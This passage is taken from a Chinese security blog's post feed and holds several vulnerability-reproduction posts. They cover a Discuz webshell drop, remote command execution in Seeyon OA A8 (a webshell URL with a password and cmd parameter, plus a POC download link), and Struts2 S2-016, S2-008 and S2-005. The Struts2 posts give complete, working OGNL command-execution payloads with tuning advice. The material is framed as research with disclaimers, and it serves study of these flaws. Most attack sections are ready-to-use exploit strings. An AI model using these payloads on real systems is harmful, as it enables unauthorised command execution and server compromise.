alt="在这里插入图片描述"></p><p><strong>访问网站生成木马文件,godz.php 密码为godz</strong><br>验证木马</p><p><img src="https://img-blog.csdnimg.cn/20190714184513361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><h2 id="请勿用于非法用途"><a href="#请勿用于非法用途" class="headerlink" title="请勿用于非法用途"></a>请勿用于非法用途</h2><hr>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Discuz漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>致远OA-A8系统的0day远程命令执行的实战</title>
      <link href="/2019/07/03/%E8%87%B4%E8%BF%9COA-A8%E7%B3%BB%E7%BB%9F%E7%9A%840day%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AE%9E%E6%88%98/"/>
      <url>/2019/07/03/%E8%87%B4%E8%BF%9COA-A8%E7%B3%BB%E7%BB%9F%E7%9A%840day%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="致远OA-A8系统的0day远程命令执行的实战"><a href="#致远OA-A8系统的0day远程命令执行的实战" class="headerlink" title="致远OA-A8系统的0day远程命令执行的实战"></a>致远OA-A8系统的0day远程命令执行的实战</h3><ul><li><ul><li><a href="#1_2">1.环境是实战，漏洞已经提交，打码子处理</a></li><li><a href="#2CNVDhttpswwwcnvdorgcnwebinfoshow5095_4">2.详细漏洞信息和修补参考CNVD官网查看https://www.cnvd.org.cn/webinfo/show/5095</a></li><li><a href="#3_6">3漏洞影响范围</a></li><li><a href="#4_16">4漏洞的复现</a></li><li><a href="#_19">第一步</a></li><li><a href="#_28">第二步</a></li><li><a href="#_36">第三步</a></li><li><a href="#POC__41">附上POC 请勿用非法用途，只供研究和学习</a></li></ul></li></ul><h2 id="1-环境是实战，漏洞已经提交，打码子处理"><a href="#1-环境是实战，漏洞已经提交，打码子处理" class="headerlink" title="1.环境是实战，漏洞已经提交，打码子处理"></a>1.环境是实战，漏洞已经提交，打码子处理</h2><h2 id="2-详细漏洞信息和修补参考CNVD官网查看https-www-cnvd-org-cn-webinfo-show-5095"><a href="#2-详细漏洞信息和修补参考CNVD官网查看https-www-cnvd-org-cn-webinfo-show-5095" class="headerlink" title="2.详细漏洞信息和修补参考CNVD官网查看https://www.cnvd.org.cn/webinfo/show/5095"></a>2.详细漏洞信息和修补参考CNVD官网查看<a href="https://www.cnvd.org.cn/webinfo/show/5095" target="_blank" rel="noopener">https://www.cnvd.org.cn/webinfo/show/5095</a></h2><h2 id="3漏洞影响范围"><a href="#3漏洞影响范围" class="headerlink" title="3漏洞影响范围"></a>3漏洞影响范围</h2><p>漏洞影响的产品版本包括：</p><p>致远A8-V5协同管理软件 V6.1sp1</p><p>致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3</p><p>致远A8+协同管理软件V7.1</p><h2 id="4漏洞的复现"><a href="#4漏洞的复现" class="headerlink" title="4漏洞的复现"></a>4漏洞的复现</h2><p>先采集一波url，找到对应版本，这个就不细说了</p><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>先访问这个路径，看有没有开启远程Servlet接口暴露</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;seeyon&#x2F;htmlofficeservlet</span><br></pre></td></tr></table></figure><p>成功反馈<br><img src="https://img-blog.csdnimg.cn/20190703150053356.png" alt="在这里插入图片描述"></p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>搞出Burp进行改包，上POC<br><img src="https://img-blog.csdnimg.cn/20190703150242400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发包 回包<br><img src="https://img-blog.csdnimg.cn/20190703150842658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190703150714256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""><br>这算是写入了</p><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>调用命令执行<br>访问 /test123456.jsp?pwd=asasd3344&amp;cmd=cmd%20+/c+net user<br><img src="https://img-blog.csdnimg.cn/20190703151141147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="附上POC-请勿用非法用途，只供研究和学习"><a href="#附上POC-请勿用非法用途，只供研究和学习" class="headerlink" title="附上POC 请勿用非法用途，只供研究和学习"></a>附上POC 请勿用非法用途，只供研究和学习</h2><p>链接：<a href="https://pan.baidu.com/s/11Yy49Fu5kc2uuisIzPbPLA" target="_blank" rel="noopener">https://pan.baidu.com/s/11Yy49Fu5kc2uuisIzPbPLA</a><br>提取码：0qk7<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】Struts2漏洞之S2-016漏洞环境和POC</title>
      <link href="/2019/07/02/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-016%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/"/>
      <url>/2019/07/02/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-016%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】Struts2漏洞之S2-016漏洞环境和POC"><a href="#【研究】Struts2漏洞之S2-016漏洞环境和POC" class="headerlink" title="【研究】Struts2漏洞之S2-016漏洞环境和POC"></a>【研究】Struts2漏洞之S2-016漏洞环境和POC</h3><ul><li><ul><li><a href="#1_2">1.环境</a></li><li><a href="#2_7">2.原理</a></li><li><a href="#3_18">3.影响版本</a></li><li><a href="#4_21">4.利用过程</a></li><li><a href="#POC_24">POC</a></li><li><a href="#POC_49">POC注意</a></li></ul></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><blockquote><p>在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。</p></blockquote><p>所以，访问<code>http://your-ip:8080/index.action?redirect:OGNL表达式</code>即可执行OGNL表达式。</p><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Struts 2.0.0 - Struts 2.3.15</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>环境打开<br><img src="https://img-blog.csdnimg.cn/20190702160552445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>此漏洞用的是get传输即可实现，直接加就好</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect:$&#123;%<span class="number">23</span>a%<span class="number">3</span>d(<span class="keyword">new</span> java.lang.ProcessBuilder(<span class="keyword">new</span> java.lang.String[]&#123;<span class="string">'cmd.exe'</span>, <span class="string">'/c'</span>,<span class="string">'whoami'</span>&#125;&#125;)).start(),%<span class="number">23</span>b%<span class="number">3</span>d%<span class="number">23</span>a.getInputStream(),%<span class="number">23</span>c%<span class="number">3</span>dnew java.io.InputStreamReader(%<span class="number">23</span>b),%<span class="number">23</span>d%<span class="number">3</span>dnew java.io.BufferedReader(%<span class="number">23</span>c),%<span class="number">23</span>e%<span class="number">3</span>dnew <span class="keyword">char</span>[<span class="number">50000</span>],%<span class="number">23</span>d.read(%<span class="number">23</span>e),%<span class="number">23</span>matt%<span class="number">3</span>d%<span class="number">23</span>context.get(<span class="string">'com.opensymphony.xwork2.dispatcher.HttpServletResponse'</span>),%<span class="number">23</span>matt.getWriter().println(%<span class="number">23</span>e),%<span class="number">23</span>matt.getWriter().flush(),%<span class="number">23</span>matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2019070216140213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载文件，打开看命令<br><img src="https://img-blog.csdnimg.cn/20190702161305961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;struts2-showcase-2.1.6&#x2F;showcase.action?redirect:$&#123;%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&#39;cmd.exe&#39;, &#39;&#x2F;c&#39;,&#39;whoami&#39;&#125;&#125;)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p>下载打开文件<br><img src="https://img-blog.csdnimg.cn/20190702161717489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="POC注意"><a href="#POC注意" class="headerlink" title="POC注意"></a>POC注意</h2><p>这里发现POC是循环一样的数据 是这两句话 #d.read(#e),#matt.getWriter().println(#e)<br>多写几遍就是手动循环几遍</p><p>还有这句话 #e=new char[50000],#d.read(#e)<br>e的大小也关乎显示内容的长短，如果发现回显显示不全，可调整大一些</p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC</title>
      <link href="/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/"/>
      <url>/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】Struts2漏洞之S2-008漏洞环境和可用POC"><a href="#【研究】Struts2漏洞之S2-008漏洞环境和可用POC" class="headerlink" title="【研究】Struts2漏洞之S2-008漏洞环境和可用POC"></a>【研究】Struts2漏洞之S2-008漏洞环境和可用POC</h3><ul><li><ul><li><a href="#1_3">1.环境</a></li><li><a href="#2_8">2.原理</a></li><li><a href="#3_20">3.影响版本</a></li><li><a href="#4_23">4.利用过程</a></li><li><a href="#POC_27">POC</a></li><li><a href="#POC_43">有效POC’’</a></li><li><a href="#POC_51">POC注意</a></li></ul></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参考 http:&#x2F;&#x2F;rickgray.me&#x2F;2016&#x2F;05&#x2F;06&#x2F;review-struts2-remote-command-execution-vulnerabilities.html</span><br></pre></td></tr></table></figure><blockquote><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。</p></blockquote><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Struts 2.1.0 - Struts 2.3.1</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>环境打开<br><img src="https://img-blog.csdnimg.cn/2019070117062659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=command&amp;expression=%<span class="number">23</span>context%<span class="number">5</span>b%<span class="number">22</span>xwork.MethodAccessor.denyMethodExecution%<span class="number">22</span>%<span class="number">5</span>d%<span class="number">3</span>dfalse%<span class="number">2</span>c%<span class="number">23f</span>%<span class="number">3</span>d%<span class="number">23</span>_memberAccess.getClass%<span class="number">28</span>%<span class="number">29</span>.getDeclaredField%<span class="number">28</span>%<span class="number">22</span>allowStaticMethodAccess%<span class="number">22</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23f</span>.setAccessible%<span class="number">28</span><span class="keyword">true</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23f</span>.set%<span class="number">28</span>%<span class="number">23</span>_memberAccess%<span class="number">2</span>ctrue%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>a%<span class="number">3</span>d<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>%<span class="number">28</span>%<span class="number">29</span>.exec%<span class="number">28</span>%<span class="number">22</span>whoami%<span class="number">22</span>%<span class="number">29</span>.getInputStream%<span class="number">28</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>b%<span class="number">3</span>dnew java.io.InputStreamReader%<span class="number">28</span>%<span class="number">23</span>a%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>c%<span class="number">3</span>dnew java.io.BufferedReader%<span class="number">28</span>%<span class="number">23</span>b%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>d%<span class="number">3</span>dnew <span class="keyword">char</span>%<span class="number">5</span>b50000%<span class="number">5</span>d%<span class="number">2</span>c%<span class="number">23</span>c.read%<span class="number">28</span>%<span class="number">23</span>d%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>genxor%<span class="number">3</span>d%<span class="number">23</span>context.get%<span class="number">28</span>%<span class="number">22</span>com.opensymphony.xwork2.dispatcher.HttpServletResponse%<span class="number">22</span>%<span class="number">29</span>.getWriter%<span class="number">28</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>genxor.println%<span class="number">28</span>%<span class="number">23</span>d%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>genxor.flush%<span class="number">28</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>genxor.close%<span class="number">28</span>%<span class="number">29</span></span><br></pre></td></tr></table></figure><p><strong>这个POC是get模式传所以我们直接URL里面拼接就行</strong></p><p><img src="https://img-blog.csdnimg.cn/20190701164539250.png" alt="在这里插入图片描述"><br>一样弹出回显<img src="https://img-blog.csdnimg.cn/20190701164717926.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="下载"><br><img src="https://img-blog.csdnimg.cn/20190701165118704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不知道什么编码，没东西好想</p><p>**</p><h2 id="有效POC’’"><a href="#有效POC’’" class="headerlink" title="有效POC’’"></a>有效POC’’</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.77.0.128:8080/struts2-showcase-2.1.6/showcase.action?debug=command&amp;expression=(%23_memberAccess.allowStaticMethodAccess=true,%23context["xwork.MethodAccessor.denyMethodExecution"]=false,%23cmd="ipconfig",%23ret=@java.lang.Runtime@getRuntime().exec(%23cmd),%23data=new+java.io.DataInputStream(%23ret.getInputStream()),%23res=new+byte[501],%23data.readFully(%23res),%23echo=new+java.lang.String(%23res),%23out=@org.apache.struts2.ServletActionContext@getResponse(),%23out.getWriter().println(%23echo))</span></span><br></pre></td></tr></table></figure><p>这个是网上找的结合007构造的POC<br>可以直接回显<br><img src="https://img-blog.csdnimg.cn/20190701165826109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="POC注意"><a href="#POC注意" class="headerlink" title="POC注意"></a>POC注意</h2><p>这个poc也是得自己去调整，不是完全试用的<br>简单阅读和实验之后发现POC，发现res存在大小上限<br>测试发现，res更改的数值可以控制回显的字数多少</p><p>我这个大于700之后就是null了<br><img src="https://img-blog.csdnimg.cn/20190701170137420.png" alt="在这里插入图片描述"><br>但是从小的开始10慢慢增加会显示的数量<br><img src="https://img-blog.csdnimg.cn/20190701170343467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190701170403572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190701170433423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>500的时候差不多都显示了，所以这个得自己千调整试试</p><p>注意灵活控制res大小，注意不要将res大小超过命令执行结果</p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】Struts2漏洞之S2-005漏洞环境和POC</title>
      <link href="/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-005%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/"/>
      <url>/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-005%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】Struts2漏洞之S2-005漏洞环境和可用POC"><a href="#【研究】Struts2漏洞之S2-005漏洞环境和可用POC" class="headerlink" title="【研究】Struts2漏洞之S2-005漏洞环境和可用POC"></a>【研究】Struts2漏洞之S2-005漏洞环境和可用POC</h3><ul><li><ul><li><a href="#1_3">1.环境</a></li><li><a href="#2_8">2.原理</a></li><li><a href="#3_34">3.影响版本</a></li><li><a href="#4_37">4.利用过程</a></li><li><a href="#POC_42">POC</a></li></ul></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><blockquote><p>参考吴翰清的《白帽子讲Web安全》一书。</p></blockquote><blockquote><p>s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上</p></blockquote><p>XWork会将GET参数的键和值利用OGNL表达式解析成Java语句，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user.address.city&#x3D;Bishkek&amp;user[&#39;favoriteDrink&#39;]&#x3D;kumys </span><br><span class="line">&#x2F;&#x2F;会被转化成</span><br><span class="line">action.getUser().getAddress().setCity(&quot;Bishkek&quot;)  </span><br><span class="line">action.getUser().setFavoriteDrink(&quot;kumys&quot;)</span><br></pre></td></tr></table></figure><p>触发漏洞就是利用了这个点，再配合OGNL的沙盒绕过方法，组成了S2-003。官方对003的修复方法是增加了安全模式（沙盒），S2-005在OGNL表达式中将安全模式关闭，又绕过了修复方法。整体过程如下：</p><ul><li>S2-003 使用<code>\u0023</code>绕过s2对<code>#</code>的防御</li><li>S2-003 后官方增加了安全模式（沙盒）</li><li>S2-005 使用OGNL表达式将沙盒关闭，继续执行代码</li></ul><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Struts 2.1.0 - Struts 2.3.1</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>环境打开</p><p><img src="https://img-blog.csdnimg.cn/20190701141120939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse'</span>)(bla)(bla)&amp;(<span class="string">'\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET'</span>)(kxlzx)(kxlzx)&amp;(<span class="string">'\u0023_memberAccess.allowStaticMethodAccess\u003dtrue'</span>)(bla)(bla)&amp;(<span class="string">'\u0023mycmd\u003d\'ipconfig\''</span>)(bla)(bla)&amp;(<span class="string">'\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)'</span>)(bla)(bla)&amp;(A)((<span class="string">'\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())'</span>)(bla))&amp;(B)((<span class="string">'\u0023myres\u003dnew\40byte[51020]'</span>)(bla))&amp;(C)((<span class="string">'\u0023mydat.readFully(\u0023myres)'</span>)(bla))&amp;(D)((<span class="string">'\u0023mystr\u003dnew\40java.lang.String(\u0023myres)'</span>)(bla))&amp;(<span class="string">'\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()'</span>)(bla)(bla)&amp;(E)((<span class="string">'\u0023myout.getWriter().println(\u0023mystr)'</span>)(bla))</span><br></pre></td></tr></table></figure><p><strong>这个POC是get模式传所以我们直接URL里面拼接就行</strong><br><img src="https://img-blog.csdnimg.cn/20190701162044691.png" alt="在这里插入图片描述"></p><p>POC放到tomcat8.5 下会返回400，这个POC没回显。找了一下其他带回显poc没效果，之后再研究，有没有大佬指导一下是tomcat的版本原因吗</p><p>Apache Tomcat/7.0.56 这个版本是有回显的<br>会弹出一下下载<br><img src="https://img-blog.csdnimg.cn/20190701162055597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后打开看看<br><img src="https://img-blog.csdnimg.cn/20190701162131556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这就是回显的命令</p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】Struts2漏洞之S2-001漏洞环境和POC</title>
      <link href="/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-001%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/"/>
      <url>/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-001%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】Struts2漏洞之S2-001漏洞环境和POC"><a href="#【研究】Struts2漏洞之S2-001漏洞环境和POC" class="headerlink" title="【研究】Struts2漏洞之S2-001漏洞环境和POC"></a>【研究】Struts2漏洞之S2-001漏洞环境和POC</h3><ul><li><ul><li><a href="#1_3">1.环境</a></li><li><a href="#2_8">2.原理</a></li><li><a href="#3_19">3.影响版本</a></li><li><a href="#4_23">4.利用过程</a></li><li><a href="#POC_33">POC</a></li></ul></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><blockquote><p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value}<br>进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value}<br>对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p></blockquote><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Struts 2.0.0 - Struts 2.0.8</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>环境打开<br>![在这里插入图片描述]<br>[图片上传失败…(image-5bcfcf-1563099334703)]<img 